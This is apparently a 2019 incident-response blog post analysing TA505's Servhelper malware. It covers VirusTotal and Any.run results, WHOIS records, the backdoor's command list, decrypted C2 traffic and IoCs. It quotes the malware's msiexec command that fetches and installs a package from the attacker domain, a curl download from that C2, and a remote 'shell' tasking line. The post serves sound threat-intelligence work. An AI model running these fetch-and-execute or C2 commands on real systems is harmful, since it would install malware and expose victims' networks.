---
layout: post
title:  "TA505 and Servhelper Malware Part 2"
description: "A walkthrough on analysising a suspicious mail attachment to the discovery and identification of malware"
date:   2019-01-19 10:49:33 +0000
tags: [Malware, Incident Response]
---

This time out 3rd party mail hosting provider has alerted us to potential malware through a blocked phishing campaign.  They can't provide us with a sample but can only confirm the file hash SHA256 e0ff9f915289dd690132e8dc1121506613d34c43d79944ef66c307736b477e60.

Not the ideal situation, but maybe we can get lucky and find a sample that has already been submitted to VirusTotal?

## VirusTotal Threat Hunting
* [https://www.virustotal.com/#/file/e0ff9f915289dd690132e8dc1121506613d34c43d79944ef66c307736b477e60/detection](https://www.virustotal.com/#/file/e0ff9f915289dd690132e8dc1121506613d34c43d79944ef66c307736b477e60/detection)

Bingo! Someone has already uploaded an identical sample :)

![Virus Total Results](/assets/TA505-VT-Jan19.png)

VirusTotal has a new behaviour tab, where we can get adiditional notes on dropped files, modified registry keys etc.

Under Processes and Shell commands we have:
 * msiexec.exe val=conn rdp=pupic /i http://upgradeoffice365.com/pack /q OnLoad="c:\windows\notepad.exe"
Now this string looks mighty familiar to a URI in our last post [TA505-Servhelper-Part1](http://www.netscylla.com/blog/2019/01/17/TA505-Servhelper-Part1.html)

![VT Process List](/assets/TA505-VT-Process.png)

Whois record:

```
Domain Name: UPGRADEOFFICE365.COM
   Registry Domain ID: 2352203051_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.reg.com
   Registrar URL: http://www.reg.ru
   Updated Date: 2019-01-14T10:30:34Z
   Creation Date: 2019-01-14T10:26:31Z
   Registry Expiry Date: 2020-01-14T10:26:31Z
   Registrar: REGISTRAR OF DOMAIN NAMES REG.RU LLC
   Registrar IANA ID: 1606
   Registrar Abuse Contact Email: abuse@reg.ru
   Registrar Abuse Contact Phone: +74955801111
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
   Name Server: A.DNSPOD.COM
   Name Server: B.DNSPOD.COM
   Name Server: C.DNSPOD.COM
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2019-01-14T19:19:57Z <<<
```
 
## Grabbing a sample
As we have no sample, and following on from what we learnt previously - we hit up the C2 domain with curl

```
curl -X POST -d "{}" --output - http://upgradeoffice365.com/pack|xxd
```

```
$ curl -X POST -d "{}" --output tmp.msi http://upgradeoffice365.com/pack
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  472k  100  472k  100     2   425k      1  0:00:02  0:00:01  0:00:01  425k

$ file tmp.msi 
tmp.msi: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, MSI Installer, 
Code page: 1252, Last Printed: Fri Sep 21 10:56:09 2012, Create Time/Date: Fri Sep 21 10:56:09 2012, 
Name of Creating Application: Windows Installer, Title: Exe to msi converter free, 
Author: www.exetomsi.com, Template: ;0, Last Saved By: devuser, Revision Number: 
{C35CF0AA-9B3F-4903-9F05-EBF606D58D3E}, Last Saved Time/Date: Tue May 21 12:56:44 2013, 
Number of Pages: 100, Number of Words: 0, Security: 0

$ shasum tmp.msi 
efc814539541a92791d4abc8e9682b50934a6b0a  tmp.msi
```

This returns a packed dll, embedded within an MSI - we can now insert this package into online dynamic tools like VirusTotal and Any.run to learn
more about the behaviour of the malware.

### Any.run 

* [https://app.any.run/tasks/4f3e8580-be65-48c7-bc49-999a7fdd8af5](https://app.any.run/tasks/4f3e8580-be65-48c7-bc49-999a7fdd8af5)

![VT Process List](/assets/TA505-anyrun.png)

Any.run has spotted the domain of the c2 as
* sysupdts.pw

```
Domain Name: SYSUPDTS.PW
Registry Domain ID: D89680237-CNIC
Registrar WHOIS Server: whois.namecheap.com
Registrar URL: https://namecheap.com
Updated Date: 2019-01-09T10:13:14.0Z
Creation Date: 2019-01-04T10:10:47.0Z
Registry Expiry Date: 2020-01-04T23:59:59.0Z
Registrar: Namecheap
Registrar IANA ID: 1068
Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Registrant Email: https://whois.nic.pw/contact/sysupdts.pw/registrant
Admin Email: https://whois.nic.pw/contact/sysupdts.pw/admin
Tech Email: https://whois.nic.pw/contact/sysupdts.pw/tech
Name Server: DNS1.REGISTRAR-SERVERS.COM
Name Server: DNS2.REGISTRAR-SERVERS.COM
DNSSEC: unsigned
Billing Email: https://whois.nic.pw/contact/sysupdts.pw/billing
Registrar Abuse Contact Email: abuse@namecheap.com
Registrar Abuse Contact Phone:
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of WHOIS database: 2019-01-19T17:17:35.0Z <<<
```

### SSL protected C2
Only this time our attempted analysis of the C2 is thwarted by SSL
 * [https://crt.sh/?q=www.sysupdts.pw](https://crt.sh/?q=www.sysupdts.pw)

|crt.sh ID |Logged At  |Not Before |Not After |Issuer Name|
|1080073283|2019-01-04	|2019-01-04	|2019-04-04	|C=US, O=Let's Encrypt, CN=Let's Encrypt Authority X3|
|1080072024|2019-01-04	|2019-01-04	|2019-04-04	|C=US, O=Let's Encrypt, CN=Let's Encrypt Authority X3|

### Ollydebug
We load the dll into Ollydebug and attempt static analysis on the dll.

Thing just got a lot tougher...

But we were able to extract the following API calls and behaviour

#### API
Methods found within the dll:
 * nop
 * tun
 * slp
 * fox
 * chrome
 * killtun
 * tunlist
 * killalltuns
 * shell
 * load
 * socks
 * selfkill
 * loaddll
 * bk
 * hijack
 * forcekill
 * sethijack
 * chromeport 
 
#### Behaviour
Manipulated registry keys:
* software\embarcadero
* borland\delphi

API calls:
* winhttp
* reg
* oleaut32
* user32

HTTP related strings:
* useragent = embarcadero URI client/1.0
* http 
* https

This looks very familiar to another malware family that was based out of Brazil and targeted financial institutes in 2018.

Embaracadero is a cross compiling platfrom based on Delphi programming language.

## Collaboration with the greater community

Attempting to reverse this dll was becoming a pain, so the analysts at Netscylla reached out to the wider community where we could swap IoCs,
compare notes and help each other get a better understanding about this malware and threat actor.

@James_inthe_box was able to share the output of this sample
* [https://app.any.run/tasks/78d05d2e-368d-4849-88b3-f71254d37fc5](https://app.any.run/tasks/78d05d2e-368d-4849-88b3-f71254d37fc5)

Unlike our sample, this sample used a different C2 and appeared to be fully communicating with the C2. Also as the sample was run was
run under a professionally licensed account, the HTTP session was Man-in-the-middled, and we can open the pcap in Wireshark and decrypt the SSL traffic.
 * vesecase.com

whois record:

```
   Domain Name: VESECASE.COM
   Registry Domain ID: 2344368615_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.namecheap.com
   Registrar URL: http://www.namecheap.com
   Updated Date: 2018-12-18T10:44:45Z
   Creation Date: 2018-12-18T10:44:39Z
   Registry Expiry Date: 2019-12-18T10:44:39Z
   Registrar: NameCheap, Inc.
   Registrar IANA ID: 1068
   Registrar Abuse Contact Email: abuse@namecheap.com
   Registrar Abuse Contact Phone: +1.6613102107
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
   Name Server: DNS1.REGISTRAR-SERVERS.COM
   Name Server: DNS2.REGISTRAR-SERVERS.COM
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2019-01-19T17:17:46Z <<<
```

### C2 communication

client:

```
key=asdgdgYss455& \
sysid=no24%3AWindows+7+Service+Pack+1+%28Version+6.1%2C+Build+7601%2C+64-bit+Edition%29_admin%3A20878&resp=i
```

server:

```
shell^net user /domain
```

client:

```
key=asdgdgYss455& \
sysid=no24%3AWindows+7+Service+Pack+1+%28Version+6.1%2C+Build+7601%2C+64-bit+Edition%29_admin%3A20878& \
resp=The+request+will+be+processed+at+a+domain+controller+for+domain+WORKGROUP.%0D%0A%0D%0ASystem+error+1355+has+occurred.%0D%0A%0D%0AThe+specified+domain+either+does+not+exist+or+could+not+be+contacted.%0D%0A%0D%0A
```


## Conclusion
We can deduce that both samples are related to the same actor, due to similarities in behaviour
 * similar URI's
 * similar MSI-to-exe/dll
 * similar C2 APIs
 * similar C2 interactions


Further cross-referencing with the proofpoint article we can see that this matches their analysis of the **January 14 “loaddll” Campaign** 

## References
* [https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505](https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505)

## IoCs

| url | vesecase.com,vesecase.com/support/form.php | 37.252.5.139|
| url | upgradeoffice365.com,upgradeoffice365.com/pack | 185.17.123.223 |
| url | sysupdts.pw | 195.123.245.214 |
| hashes |e0ff9f915289dd690132e8dc1121506613d34c43d79944ef66c307736b477e60 | upgradeoffice dll|
| hashes | efc814539541a92791d4abc8e9682b50934a6b0a |upgradeoffice msi|
| hashes | a9492312f1258567c3633ed077990fe053776cd576aa60ac7589c6bd7829d549 | vesecase dll |
